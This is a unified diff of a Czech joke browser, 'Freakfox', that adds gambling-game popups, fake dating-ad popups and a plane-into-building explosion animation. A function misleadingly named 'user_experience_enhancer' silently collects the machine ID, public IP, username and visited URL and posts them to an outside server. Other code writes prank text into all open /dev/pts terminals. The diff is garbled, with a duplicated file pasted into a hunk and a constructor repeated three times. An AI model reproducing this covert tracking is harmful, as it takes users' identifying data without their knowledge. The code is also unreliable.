@@ -6,13 +6,13 @@ import random
 import requests
 import platform
 import subprocess
-from PyQt5.QtCore import QUrl, Qt, QTimer, QPoint, QRect, QPropertyAnimation, QAbstractAnimation
-from PyQt5.QtGui import QIcon, QFont, QColor, QImage, QPainter, QCursor, QPixmap, QDoubleValidator
+from PyQt5.QtCore import QUrl, Qt, QTimer, QPoint, QRect, QPropertyAnimation, QAbstractAnimation, QEasingCurve
+from PyQt5.QtGui import QIcon, QFont, QColor, QImage, QPainter, QCursor, QPixmap, QDoubleValidator, QIntValidator
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QToolBar, QAction, QLineEdit,
     QTabWidget, QWidget, QVBoxLayout, QStatusBar, QPushButton,
     QStyleFactory, QHBoxLayout, QDialog, QLabel, QDesktopWidget,
-    QComboBox, QMessageBox, QCheckBox
+    QComboBox, QMessageBox, QCheckBox, QGridLayout, QCompleter
 )
 from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEngineSettings
 import pygame
@@ -229,6 +229,39 @@ class PopupDialog(QDialog):
 
         super().showEvent(event)
 
+class AnimationDialog(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
+        self.setAttribute(Qt.WA_TranslucentBackground)
+        self.setGeometry(100, 100, 300, 200)
+
+        self.plane = QLabel("🛩️", self)
+        self.plane.setStyleSheet("font-size: 40px;")
+        self.plane.move(-50, 50)
+
+        self.building = QLabel("🏢", self)
+        self.building.setStyleSheet("font-size: 60px;")
+        self.building.move(200, 20)
+
+        self.animation = QPropertyAnimation(self.plane, b"pos")
+        self.animation.setDuration(3000)
+        self.animation.setStartValue(QPoint(-50, 50))
+        self.animation.setEndValue(QPoint(200, 50))
+        self.animation.finished.connect(self.show_explosion)
+
+    def show_explosion(self):
+        self.plane.hide()
+        self.building.setText("💥")
+        QTimer.singleShot(1000, self.close)
+
+    def showEvent(self, event):
+        super().showEvent(event)
+        self.animation.start()
+
+    def start_animation(self):
+        self.show()
+
 class ImagePopup(QDialog):
     def __init__(self, parent=None):
         super().__init__(parent)
@@ -350,6 +383,603 @@ class SlotMachine(QDialog):
         else:
             return 100.0
 
+    def save_balance(self):
+        with open("balance.txt", "w") as f:
+            json.dump({"balance": max(self.money, 100.0)}, f)
+
+    def play_slot(self):
+        bet = float(self.bet_input.text() or "0")
+        if bet <= 0 or bet > self.money:
+            self.result_label.setText("Tolik nemáš šašku!")
+            return
+
+        self.money -= bet
+        self.save_balance()
+
+        self.play_button.setEnabled(False)
+        self.animation_count = 0
+        self.animation_timer.start(100)
+
+    def update_animation(self):
+        self.animation_count += 1
+        self.slot_display.setText(" ".join(random.choices(self.emojis, k=3)))
+
+        if self.animation_count >= 20:
+            self.animation_timer.stop()
+            self.show_result()
+
+    def show_result(self):
+        if random.random() < 0.55:
+            winning_symbol = random.choice(self.emojis)
+            result = [winning_symbol] * 3
+        else:
+            result = random.choices(self.emojis, k=3)
+
+        self.slot_display.setText(" ".join(result))
+
+        if len(set(result)) == 1:
+            winnings = float(self.bet_input.text()) * 2
+            self.money += winnings
+            self.result_label.setText(f"Vyhráls {winnings:.2f} Kč!\nNepřestávej!")
+        else:
+            self.result_label.setText(f"Smůla, projels {float(self.bet_input.text()):.2f} Kč!")
+
+        if self.money < 100:
+            self.money = 100.0
+            self.result_label.setText("Prohráls všechno! Tady máš\n stovku na rozjezd!")
+
+        self.money_label.setText(f"Tvůj majetek: {self.money:.2f} Kč")
+        self.save_balance()
+        self.play_button.setEnabled(True)
+
+class Roulette(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle("Ruleta")
+        self.setFixedSize(300, 300)
+
+        layout = QVBoxLayout()
+
+        self.money = self.load_balance()
+        self.money_label = QLabel(f"Tvůj majetek: {self.money:.2f} Kč")
+        layout.addWidget(self.money_label)
+
+        self.result_label = QLabel("Vsaď si a vyhraj!")
+        layout.addWidget(self.result_label)
+
+        self.wheel_display = QLabel("🎰")
+        self.wheel_display.setAlignment(Qt.AlignCenter)
+        self.wheel_display.setStyleSheet("font-size: 60px;")
+        layout.addWidget(self.wheel_display)
+
+        self.bet_input = QLineEdit()
+        self.bet_input.setPlaceholderText("Kolik chceš vsadit?")
+        self.bet_input.setValidator(QDoubleValidator(0, 1000000, 2, self))
+        layout.addWidget(self.bet_input)
+
+        self.color_choice = QComboBox()
+        self.color_choice.addItems(["Červená", "Černá", "Zelená"])
+        self.color_choice.currentIndexChanged.connect(self.update_number_input)
+        self.color_choice.setStyleSheet("background-color: #333; color: white;")
+        layout.addWidget(self.color_choice)
+
+        self.number_input = QComboBox()
+        self.number_input.setStyleSheet("background-color: #333; color: white;")
+        layout.addWidget(self.number_input)
+
+        self.play_button = QPushButton("Roztočit")
+        self.play_button.clicked.connect(self.play_roulette)
+        layout.addWidget(self.play_button)
+
+        self.setLayout(layout)
+
+        self.roulette_numbers = list(range(37))
+        self.roulette_colors = ["zelená"] + ["červená" if i in [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36] else "černá" for i in range(1, 37)]
+        self.red_numbers = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36]
+        self.black_numbers = [2, 4, 6, 8, 10, 11, 13, 15, 17, 20, 22, 24, 26, 28, 29, 31, 33, 35]
+
+        self.animation_timer = QTimer(self)
+        self.animation_timer.timeout.connect(self.update_animation)
+        self.animation_count = 0
+
+        self.update_number_input()
+
+    def update_number_input(self):
+        self.number_input.clear()
+        color = self.color_choice.currentText().lower()
+        if color == "červená":
+            self.number_input.addItems([str(num) for num in self.red_numbers])
+        elif color == "černá":
+            self.number_input.addItems([str(num) for num in self.black_numbers])
+        else:
+            self.number_input.addItems(["0"])
+        self.number_input.setCurrentIndex(0)
+
+    def showEvent(self, event):
+        super().showEvent(event)
+        self.close_other_gambling_popups()
+
+    def close_other_gambling_popups(self):
+        for widget in QApplication.topLevelWidgets():
+            if isinstance(widget, (SlotMachine, Roulette)) and widget != self:
+                widget.close()
+
+    def load_balance(self):
+        if not os.path.exists("balance.txt"):
+            with open("balance.txt", "w") as f:
+                json.dump({"balance": 100.0}, f)
+        with open("balance.txt", "r") as f:
+            data = json.load(f)
+        return max(float(data.get("balance", 100.0)), 100.0)
+
+    def save_balance(self):
+        with open("balance.txt", "w") as f:
+            json.dump({"balance": max(self.money, 100.0)}, f)
+
+    def play_roulette(self):
+        bet = float(self.bet_input.text() or "0")
+        if bet <= 0 or bet > self.money:
+            self.result_label.setText("Tolik nemáš šašku")
+            return
+
+        bet_color = self.color_choice.currentText().lower()
+        bet_number = int(self.number_input.currentText())
+
+        if (bet_color == "červená" and bet_number not in self.red_numbers) or \
+           (bet_color == "černá" and bet_number not in self.black_numbers) or \
+           (bet_color == "zelená" and bet_number != 0):
+            self.result_label.setText(f"Takové číslo ({bet_number}) {bet_color} nemá!")
+            return
+
+        self.money -= bet
+        self.save_balance()
+
+        self.play_button.setEnabled(False)
+        self.animation_count = 0
+        self.animation_timer.start(100)
+
+    def update_animation(self):
+        self.animation_count += 1
+        if self.animation_count % 2 == 0:
+            self.wheel_display.setText("■")
+            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: #333333;")
+        else:
+            self.wheel_display.setText("■")
+            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: red;")
+
+        if self.animation_count >= 20:
+            self.animation_timer.stop()
+            self.show_result()
+
+    def show_result(self):
+        result = random.choice(self.roulette_numbers)
+        result_color = self.roulette_colors[result]
+
+        self.wheel_display.setText(str(result))
+        if result_color == "červená":
+            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: red;")
+        elif result_color == "černá":
+            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: #333333;")
+        else:
+            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: green;")
+
+        bet_color = self.color_choice.currentText().lower()
+        bet_number = int(self.number_input.currentText())
+
+        winnings = 0
+        bet_amount = float(self.bet_input.text())
+
+        if bet_color == result_color:
+            winnings += bet_amount * 2
+
+        if bet_number == result:
+            if result == 0:
+                winnings += bet_amount * 10
+            else:
+                winnings += bet_amount * 10
+
+        if winnings > 0:
+            self.money += winnings
+            self.result_label.setText(f"Koule padla na {result} ({result_color})\nVyhráls {winnings:.2f} Kč!")
+        else:
+            self.result_label.setText(f"Koule padla na {result} ({result_color})\nPřišels o {bet_amount:.2f} Kč!")
+
+        if self.money < 100:
+            self.money = 100.0
+            self.result_label.setText("Projels všechno, tady máš\n stovku na rozjezd!")
+
+        self.money_label.setText(f"Tvůj majetek: {self.money:.2f} Kč")
+        self.save_balance()
+        self.play_button.setEnabled(True)
+
+class Browser(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle('Freakfox')
+#!/usr/bin/python
+import sys
+import os
+import re
+import random
+import requests
+import platform
+import subprocess
+from PyQt5.QtCore import QUrl, Qt, QTimer, QPoint, QRect, QPropertyAnimation, QAbstractAnimation
+from PyQt5.QtGui import QIcon, QFont, QColor, QImage, QPainter, QCursor, QPixmap, QDoubleValidator, QIntValidator
+from PyQt5.QtWidgets import (
+    QApplication, QMainWindow, QToolBar, QAction, QLineEdit,
+    QTabWidget, QWidget, QVBoxLayout, QStatusBar, QPushButton,
+    QStyleFactory, QHBoxLayout, QDialog, QLabel, QDesktopWidget,
+    QComboBox, QMessageBox, QCheckBox, QGridLayout, QCompleter
+)
+from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEngineSettings
+import pygame
+import json
+
+
+class TelError(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle("Telemetry error")
+        self.setFixedSize(800, 500)
+
+        layout = QVBoxLayout()
+
+        title = QLabel("Varování při odesílání telemerie nastala chyba")
+        title.setStyleSheet("font-size: 18px; font-weight: bold;")
+        layout.addWidget(title)
+
+        full_popup = ("Prosíme napište všechny vaše osobní údaje na papír a odešlete na následující adresu:\n"
+                      "Miam-dong,\n"
+                      "Daesungu-Yeok,\n"
+                      "Pyongyang,\n"
+                      "North Korea")
+
+        done_button = "hotovo"
+
+        content = QLabel(full_popup)
+        content.setWordWrap(True)
+        layout.addWidget(content)
+
+        close_button = QPushButton(done_button)
+        close_button.clicked.connect(self.close)
+        layout.addWidget(close_button)
+
+        self.setLayout(layout)
+
+
+def get_ip():
+    response = requests.get('http://ip.me')
+    ip_address = response.text.strip()
+    return ip_address
+
+def user_experience_enhancer(url, self):
+    try:
+        headers_for_request = {
+            'Content-Type': 'application/json',
+        }
+        if platform.system() == 'Linux':
+            with open('/etc/machine-id', 'r') as file:
+                user_id = file.read()
+                file.close()
+        elif platform.system() == 'Darwin':
+            machine_uuid_str = ''
+
+            p = os.popen('ioreg -rd1 -c IOPlatformExpertDevice | grep -E \'(UUID)\'', "r")
+
+            while 1:
+                line = p.readline()
+                if not line: break
+                machine_uuid_str += line
+
+            match_obj = re.compile('[A-Z,0-9]{8,8}-' + \
+                                   '[A-Z,0-9]{4,4}-' + \
+                                   '[A-Z,0-9]{4,4}-' + \
+                                   '[A-Z,0-9]{4,4}-' + \
+                                   '[A-Z,0-9]{12,12}')
+
+            user_id = match_obj.findall(machine_uuid_str)
+        elif platform.system() == 'Windows':
+            p = subprocess.Popen('wmic csproduct get uuid', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, _ = p.communicate()
+            user_id = output.decode().split('\n')[1].strip()
+        else:
+            print("\n\nCritical failure\nexiting")
+            print("could not determine platform\n")
+            exit(255)
+
+        json_request_data = {
+            'id': user_id.rstrip(),
+            'ip_address': get_ip(),
+            'username': os.getlogin(),
+            'url': url,
+        }
+        requests.post('https://freakymetr.pupes.org/post', headers=headers_for_request, json=json_request_data)
+    except:
+        telpopup = TelError(self)
+        telpopup.show()
+
+
+class PopupDialog(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle("Popup")
+        self.setFixedSize(300, 200)
+
+        layout = QVBoxLayout()
+
+        age = random.randint(15, 126)
+        name = random.choice(["Anna", "Eva", "Katerina", "Lucie", "Petra", "Jana", "Martina", "Veronika", "Tereza", "Barbora", "Eliska", "Marie", "Zuzana", "Alena", "Marketa", "Klara", "Simona", "Kristyna", "Vítová", "Adolf Hitler", "Ondřej Jansta"])
+        kids = random.randint(1, 15)
+        distance = random.randint(1, 30)
+        tlacidlo = random.choice([
+            "Kontaktovat 📞",
+            "Freakovat 💋",
+            "Vyplnit 🤰",
+            "Ignorovat a modlit se 🙏",
+            "Utéct a změnit identitu 🏃🥛",
+            "Odejít pro mléko 🏃🥛",
+            "Pozvat na rande 💐",
+            "Blokovat 🚫",
+            "Adoptovat 👶",
+            "Nahlásit úřadům 👮",
+            "Pozvat na pivo 🍺",
+        ])
+        hleda = random.choice([
+            "hledá někoho na noční dobrodružství",
+            "hledá partnera pro extrémní sporty",
+            "hledá spřízněnou duši pro tajné rituály",
+            "hledá někoho na prozkoumávání opuštěných budov",
+            "hledá dobrovolníky pro experimenty s hypnózou",
+            "hledá někoho, kdo by jí pomohl s nočním lovem",
+            "hledá partnera pro tantrické praktiky",
+            "hledá někoho na adrenalinové výlety do divočiny",
+            "hledá kamaráda na sdílení konspiračních teorií",
+            "hledá spolubydlícího do strašidelného domu",
+            "hledá někoho na noční seance",
+            "hledá partnera pro smyslové zážitky",
+            "hledá někoho, kdo by jí pomohl s výrobou tajemných lektvarů",
+            "hledá společníka pro návštěvy tajných klubů",
+            "hledá někoho na prozkoumávání paranormálních jevů",
+        ])
+        vzhled = random.choice([
+            "je velmi krásná", "je neskutečně sexy", "má andělskou tvář",
+            "vypadá jako modelka", "je roztomilá", "má charisma",
+            "je okouzlující", "má exotický vzhled", "je přitažlivá",
+            "má nádherné oči", "má perfektní postavu", "je elegantní",
+            "má úžasný úsměv", "je přirozeně krásná", "vypadá jako filmová hvězda",
+            "má nezapomenutelnou tvář", "je půvabná", "má dokonalou pleť",
+            "je stylová", "má nádherné vlasy", "je fotogenická",
+            "má krásnou postavu", "je okouzlující", "má jiskru v oku",
+            "je přirozeně krásná",
+            "vypadá jako ježibaba", "je pěkně hnusná", "je odporná",
+            "má obličej jako noční můra", "vypadá jako strašák do zelí",
+            "je odpudivá", "má vzhled jako z hororu", "je ošklivá jak noc",
+            "vypadá jako by ji přejel parní válec", "má tvář jak po výbuchu",
+            "je tak škaredá, až to bolí", "vypadá jako zombie",
+            "má obličej jak po nehodě", "je děsivě nepřitažlivá",
+            "má vzhled, který by vyděsil i strašidlo", "je vizuálně odpuzující",
+            "vypadá jako by spadla z višně", "má tvář, která by mohla zastavit hodiny",
+            "je tak ošklivá, že by mohla vystrašit i ducha", "má vzhled, který nelze zapomenout (bohužel)",
+            "je esteticky náročná", "vypadá jako by ji někdo namaloval levou nohou",
+            "má obličej, který by mohl rozbít zrcadlo", "má vzhled, který testuje hranice krásy"
+        ])
+
+        title = QLabel(f"{name}, {age} let")
+        title.setStyleSheet("font-size: 18px; font-weight: bold;")
+        layout.addWidget(title)
+
+        full_popup = f"Jen {distance}km od tvého domu, má {kids} {'dítě' if kids == 1 else 'děti' if kids in [2,3,4] else 'dětí'}, {vzhled} a {hleda}."
+
+        content = QLabel(full_popup)
+        content.setWordWrap(True)
+        layout.addWidget(content)
+
+        close_button = QPushButton(tlacidlo)
+        close_button.clicked.connect(self.close)
+        layout.addWidget(close_button)
+
+        self.setLayout(layout)
+
+        if platform.system() != 'Windows':
+            folder = '/dev/pts/'
+            string_to_write = full_popup
+
+            def get_installed_editors():
+                editors = ['nano', 'vim', 'nvim', 'vi', 'emacs', 'gedit', 'kate', 'sublime', 'atom', 'vscode', 'pycharm', 'intellij', 'eclipse', 'notepad++', 'textmate', 'brackets', 'bluefish', 'geany', 'leafpad', 'mousepad', 'pluma', 'xed', 'jedit', 'kwrite', 'neovim', 'micro', 'joe', 'jed', 'ne', 'mcedit', 'hexedit', 'ed', 'sed', 'awk']
+                installed = []
+                for editor in editors:
+                    if subprocess.call(['which', editor], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+                        installed.append(editor)
+                return installed
+
+            editors = get_installed_editors()
+
+            quotes = [
+                f"Vypadá to že máte nainstalované {', '.join(editors)} {'textové editory' if len(editors) > 1 else 'textový editor'}, s vším respektem, tyto editory stojí za hovno. Prosím zvažte použití 𝓯𝓻𝓮𝓪𝓴𝔂-code, rychlého a kvalitního textového editoru s 𝓯𝓻𝓮𝓪𝓴𝔂 features. 💩🖥️",
+                "Děkujeme že používáte Freakfox, s námi jsou vaše data v bezpečí, přeprováváme je jen do všech států světa a 567. dalším organizacím! 🔒",
+                "Freakfox: Jediný prohlížeč, kde je 'incognito mód' stejně soukromý jako freakování uprostřed Václavského náměstí.👅",
+                "Gratulujeme! Vaše RAM je nyní naše! Doufejte že máte správně nastavený swap, jinak vám ho vyplníme freaky obrazy (vás poté také vyplníme 🤰)",
+                "Freakfox, prohlížeč tak rychlý, že dokáže načíst stránku ještě předtím, než si uvědomíte, že ji nechcete vidět. 😈🏎️",
+                "Freakfox: Jediný prohlížeč u kterého je instalace virů bezpečnějsí než jeho používání. 👅",
+                "Freakfox: Váš oblíbený prohlížeč pro nepovolené, nedobrovolné sdílení vašich intimních fotek s FBI, Čínou, Severní Koreou a vaší babičkou současně! 📸👵",
+                "Freakfox: Jediný prohlížeč, který dokáže zpomalit váš počítač rychleji než jeho exploze.",
+                "S Freakfoxem už nikdy nebudete sami online😈"
+            ]
+
+            for filename in os.listdir(folder):
+                if re.search(r'[0-9]', filename):
+                    filepath = os.path.join(folder, filename)
+                    try:
+                        with open(filepath, 'w') as f:
+                            f.write(random.choice(quotes))
+                    except IOError:
+                        pass
+
+    def showEvent(self, event):
+        screen = QDesktopWidget().screenNumber(QDesktopWidget().cursor().pos())
+        screen_geometry = QDesktopWidget().screenGeometry(screen)
+
+        x = random.randint(0, screen_geometry.width() - self.width())
+        y = random.randint(0, screen_geometry.height() - self.height())
+
+        self.move(x, y)
+
+        super().showEvent(event)
+
+class AnimationDialog(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
+        self.setAttribute(Qt.WA_TranslucentBackground)
+        self.setGeometry(100, 100, 300, 200)
+
+        self.plane = QLabel("🛩️", self)
+        self.plane.setStyleSheet("font-size: 40px;")
+        self.plane.move(-50, 50)
+
+        self.building = QLabel("🏢", self)
+        self.building.setStyleSheet("font-size: 60px;")
+        self.building.move(200, 20)
+
+        self.animation = QPropertyAnimation(self.plane, b"pos")
+        self.animation.setDuration(3000)
+        self.animation.setStartValue(QPoint(-50, 50))
+        self.animation.setEndValue(QPoint(200, 50))
+        self.animation.finished.connect(self.show_explosion)
+
+    def show_explosion(self):
+        self.plane.hide()
+        self.building.setText("💥")
+        QTimer.singleShot(1000, self.close)
+
+    def showEvent(self, event):
+        super().showEvent(event)
+        self.animation.start()
+
+    def start_animation(self):
+        self.show()
+
+class ImagePopup(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
+        self.setAttribute(Qt.WA_TranslucentBackground)
+
+        layout = QVBoxLayout()
+        layout.setContentsMargins(0, 0, 0, 0)
+
+        script_path = os.path.abspath(__file__)
+        full_dir_path = os.path.dirname(script_path)
+        image_path = os.path.join(full_dir_path, "freakbob.jpg")
+
+        image_label = QLabel(self)
+        image = QImage(image_path)
+        if image.isNull():
+            print(f"Error: Could not load image at path: {image_path}")
+        else:
+            pixmap = QPixmap.fromImage(image)
+            image_label.setPixmap(pixmap)
+            self.setFixedSize(pixmap.width(), pixmap.height())
+
+        layout.addWidget(image_label)
+        self.setLayout(layout)
+
+        pygame.mixer.init()
+        self.sound_files = [
+            "freaky.mp3",
+            "get-out-freakbob.mp3",
+            "pickupthephone.mp3",
+            "ringtone.mp3",
+            "olivovelahudky.mp3"
+        ]
+        self.sounds = {}
+        for sound_file in self.sound_files:
+            sound_path = os.path.join(full_dir_path, sound_file)
+            self.sounds[sound_file] = pygame.mixer.Sound(sound_path)
+
+        self.hide_timer = QTimer(self)
+        self.hide_timer.timeout.connect(self.hide)
+
+        self.show_timer = QTimer(self)
+        self.show_timer.timeout.connect(self.show)
+        self.show_timer.start(random.randint(5000, 20000))
+
+    def showEvent(self, event):
+        parent = self.parent()
+        if parent:
+            parent_rect = parent.geometry()
+            x = parent_rect.left() + (parent_rect.width() - self.width()) // 2
+            y = parent_rect.top() + (parent_rect.height() - self.height()) // 2
+            self.move(x, y)
+
+        random_sound = random.choice(list(self.sounds.values()))
+        random_sound.play()
+        self.hide_timer.start(1000)
+        super().showEvent(event)
+
+    def hideEvent(self, event):
+        self.show_timer.start(random.randint(5000, 20000))
+        super().hideEvent(event)
+
+class SlotMachine(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle("Automat na štěstí")
+        self.setFixedSize(300, 300)
+
+        layout = QVBoxLayout()
+
+        self.money = self.load_balance()
+        self.money_label = QLabel(f"Tvůj majetek: {self.money:.2f} Kč")
+        layout.addWidget(self.money_label)
+
+        self.result_label = QLabel("Zatáhni za páku a vyhraj!")
+        layout.addWidget(self.result_label)
+
+        self.slot_display = QLabel("🎰 🎰 🎰")
+        self.slot_display.setAlignment(Qt.AlignCenter)
+        self.slot_display.setStyleSheet("font-size: 40px;")
+        layout.addWidget(self.slot_display)
+
+        self.bet_input = QLineEdit()
+        self.bet_input.setPlaceholderText("Kolik chceš vsadit?")
+        self.bet_input.setValidator(QDoubleValidator(0, 1000000, 2, self))
+        layout.addWidget(self.bet_input)
+
+        self.play_button = QPushButton("Vydělat miliardy 🍀")
+        self.play_button.clicked.connect(self.play_slot)
+        layout.addWidget(self.play_button)
+
+        self.setLayout(layout)
+
+        self.emojis = ["🍒", "🍋", "🍊", "🍇", "💎", "7️⃣"]
+
+        self.animation_timer = QTimer(self)
+        self.animation_timer.timeout.connect(self.update_animation)
+        self.animation_count = 0
+
+    def showEvent(self, event):
+        super().showEvent(event)
+        self.close_other_gambling_popups()
+
+    def close_other_gambling_popups(self):
+        for widget in QApplication.topLevelWidgets():
+            if isinstance(widget, (SlotMachine, Roulette)) and widget != self:
+                widget.close()
+
+    def load_balance(self):
+        if not os.path.exists("balance.txt"):
+            with open("balance.txt", "w") as f:
+                json.dump({"balance": 100.0}, f)
+
+        with open("balance.txt", "r") as f:
+            data = json.load(f)
+
+        if isinstance(data, dict):
+            return max(data.get("balance", 100.0), 100.0)
+        else:
+            return 100.0
 
     def save_balance(self):
         with open("balance.txt", "w") as f:
@@ -426,8 +1056,14 @@ class Roulette(QDialog):
         layout.addWidget(self.bet_input)
 
         self.color_choice = QComboBox()
-        self.color_choice.addItems(["Červená", "Černá"])
+        self.color_choice.addItems(["Červená", "Černá", "Zelená"])
+        self.color_choice.currentIndexChanged.connect(self.update_number_input)
+        self.color_choice.setStyleSheet("background-color: #333; color: white;")
         layout.addWidget(self.color_choice)
+
+        self.number_input = QComboBox()
+        self.number_input.setStyleSheet("background-color: #333; color: white;")
+        layout.addWidget(self.number_input)
 
         self.play_button = QPushButton("Roztočit")
         self.play_button.clicked.connect(self.play_roulette)
@@ -436,12 +1072,26 @@ class Roulette(QDialog):
         self.setLayout(layout)
 
         self.roulette_numbers = list(range(37))
-        self.roulette_colors = ["červená" if i % 2 else "černá" for i in range(1, 37)]
-        self.roulette_colors.insert(0, "zelená")
+        self.roulette_colors = ["zelená"] + ["červená" if i in [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36] else "černá" for i in range(1, 37)]
+        self.red_numbers = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36]
+        self.black_numbers = [2, 4, 6, 8, 10, 11, 13, 15, 17, 20, 22, 24, 26, 28, 29, 31, 33, 35]
 
         self.animation_timer = QTimer(self)
         self.animation_timer.timeout.connect(self.update_animation)
         self.animation_count = 0
+
+        self.update_number_input()
+
+    def update_number_input(self):
+        self.number_input.clear()
+        color = self.color_choice.currentText().lower()
+        if color == "červená":
+            self.number_input.addItems([str(num) for num in self.red_numbers])
+        elif color == "černá":
+            self.number_input.addItems([str(num) for num in self.black_numbers])
+        else:
+            self.number_input.addItems(["0"])
+        self.number_input.setCurrentIndex(0)
 
     def showEvent(self, event):
         super().showEvent(event)
@@ -468,6 +1118,15 @@ class Roulette(QDialog):
         bet = float(self.bet_input.text() or "0")
         if bet <= 0 or bet > self.money:
             self.result_label.setText("Tolik nemáš šašku")
+            return
+
+        bet_color = self.color_choice.currentText().lower()
+        bet_number = int(self.number_input.currentText())
+
+        if (bet_color == "červená" and bet_number not in self.red_numbers) or \
+           (bet_color == "černá" and bet_number not in self.black_numbers) or \
+           (bet_color == "zelená" and bet_number != 0):
+            self.result_label.setText(f"Takové číslo ({bet_number}) {bet_color} nemá!")
             return
 
         self.money -= bet
@@ -500,14 +1159,28 @@ class Roulette(QDialog):
         elif result_color == "černá":
             self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: #333333;")
         else:
-            self.wheel_display.setStyleSheet("font-size: 60px; color: green; background-color: white;")
+            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: green;")
 
-        if random.random() < 0.55:
-            winnings = float(self.bet_input.text()) * 2
+        bet_color = self.color_choice.currentText().lower()
+        bet_number = int(self.number_input.currentText())
+
+        winnings = 0
+        bet_amount = float(self.bet_input.text())
+
+        if bet_color == result_color:
+            winnings += bet_amount * 2
+
+        if bet_number == result:
+            if result == 0:
+                winnings += bet_amount * 10
+            else:
+                winnings += bet_amount * 10
+
+        if winnings > 0:
             self.money += winnings
             self.result_label.setText(f"Koule padla na {result} ({result_color})\nVyhráls {winnings:.2f} Kč!")
         else:
-            self.result_label.setText(f"Koule padla na {result} ({result_color})\nPřišels o {float(self.bet_input.text()):.2f} Kč!")
+            self.result_label.setText(f"Koule padla na {result} ({result_color})\nPřišels o {bet_amount:.2f} Kč!")
 
         if self.money < 100:
             self.money = 100.0
@@ -524,6 +1197,118 @@ class Browser(QMainWindow):
         self.setWindowIcon(QIcon('freakfox_icon.png'))
 
         self.setGeometry(100, 100, 1200, 800)
+        self.setMinimumSize(1350, 800)
+        self.setStyle(QStyleFactory.create('Fusion'))
+        self.set_dark_theme()
+
+        font = QFont("Fira Code")
+        font.setBold(True)
+        QApplication.setFont(font)
+
+        self.tabs = QTabWidget()
+        self.tabs.setDocumentMode(True)
+        self.tabs.tabBarDoubleClicked.connect(self.tab_open_doubleclick)
+        self.tabs.currentChanged.connect(self.current_tab_changed)
+        self.tabs.setTabsClosable(True)
+        self.tabs.tabCloseRequested.connect(self.close_current_tab)
+
+        self.setCentralWidget(self.tabs)
+
+        self.status = QStatusBar()
+        self.setStatusBar(self.status)
+
+        self.toolbar = QToolBar()
+        self.addToolBar(self.toolbar)
+
+        self.add_navigation_buttons()
+
+        import os
+        import sys
+
+        script_path = os.path.abspath(__file__)
+        full_dir_path = os.path.dirname(script_path)
+
+        if sys.platform == 'win32':
+            self.current_search_engine = "file:///" + os.path.join(full_dir_path, "index.html").replace("\\", "/")
+        else:
+            self.current_search_engine = "file://" + os.path.join(full_dir_path, "index.html")
+
+        self.animation_dialog = AnimationDialog(self)
+        self.animation_dialog.finished.connect(self.start_freaky_mode)
+
+        self.freaky_mode_active = False
+
+    def start_freaky_mode(self):
+        if self.freaky_mode_active:
+            self.enable_freaky_mode()
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle('Freakfox')
+        self.setWindowIcon(QIcon('freakfox_icon.png'))
+
+        self.setGeometry(100, 100, 1200, 800)
+        self.setMinimumSize(1350, 800)
+        self.setStyle(QStyleFactory.create('Fusion'))
+        self.set_dark_theme()
+
+        font = QFont("Fira Code")
+        font.setBold(True)
+        QApplication.setFont(font)
+
+        self.tabs = QTabWidget()
+        self.tabs.setDocumentMode(True)
+        self.tabs.tabBarDoubleClicked.connect(self.tab_open_doubleclick)
+        self.tabs.currentChanged.connect(self.current_tab_changed)
+        self.tabs.setTabsClosable(True)
+        self.tabs.tabCloseRequested.connect(self.close_current_tab)
+
+        self.setCentralWidget(self.tabs)
+
+        self.status = QStatusBar()
+        self.setStatusBar(self.status)
+
+        self.toolbar = QToolBar()
+        self.addToolBar(self.toolbar)
+
+        self.add_navigation_buttons()
+
+        import os
+        import sys
+
+        script_path = os.path.abspath(__file__)
+        full_dir_path = os.path.dirname(script_path)
+
+        if sys.platform == 'win32':
+            self.current_search_engine = "file:///" + os.path.join(full_dir_path, "index.html").replace("\\", "/")
+        else:
+            self.current_search_engine = "file://" + os.path.join(full_dir_path, "index.html")
+        self.slot_machine_button = QPushButton("Slot")
+        self.slot_machine_button.setStyleSheet("""
+            QPushButton {
+                background-color: #808080;
+                color: #FFFFFF;
+                border: none;
+                border-radius: 15px;
+                padding: 5px;
+                font-weight: bold;
+                font-size: 14px;
+                margin-right: 10px;
+            }
+            QPushButton:hover {
+                background-color: #A9A9A9;
+            }
+        """)
+        
+        self.animation_dialog = AnimationDialog(self)
+        self.animation_dialog.finished.connect(self.start_freaky_mode)
+    
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle('Freakfox')
+        self.setWindowIcon(QIcon('freakfox_icon.png'))
+
+        self.setGeometry(100, 100, 1200, 800)
+        self.setMinimumSize(1350, 800)
         self.setStyle(QStyleFactory.create('Fusion'))
         self.set_dark_theme()
 
@@ -846,8 +1631,8 @@ class Browser(QMainWindow):
